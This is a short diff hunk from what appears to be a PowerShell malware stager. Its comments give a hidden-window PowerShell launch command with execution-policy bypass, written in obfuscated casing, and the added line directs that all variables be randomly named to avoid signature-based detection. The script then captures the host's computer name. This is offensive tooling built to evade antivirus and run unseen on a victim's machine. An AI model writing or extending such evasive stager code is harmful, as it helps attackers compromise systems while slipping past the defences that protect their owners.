@@ -2,6 +2,7 @@
 # stager should be created with the following powershell command
 # Opens powershell with script block bypass in a hidden window 
 # powershell.exe -NoPr -WINd 1 -eXEc ByP 
+#ALL variables should be randomly named to avoid signature based detection.
 
 #change variable of computer name
 $AAAAAA = $COMPUTERNAME
